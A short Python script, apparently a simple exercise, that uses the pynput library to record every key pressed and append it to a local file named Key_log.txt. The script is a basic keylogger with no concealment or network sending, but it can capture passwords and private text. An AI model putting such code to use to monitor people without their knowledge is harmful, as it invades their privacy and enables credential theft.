from pynput import keyboard



def OnPress(key) : # Define the function for handling key presses
    
# write the pressed key to a log file
    with open("Key_log.txt", 'a') as f :
        try : 
            f.write(key.char)
        except AttributeError: 
            f.write(f'[{key}]') # for special keys (shift, ctrl...)
            
    
# Create the keyboard listener with `on_press` handler       
with keyboard.Listener (
    on_press = OnPress) as listener :
    listener.join()





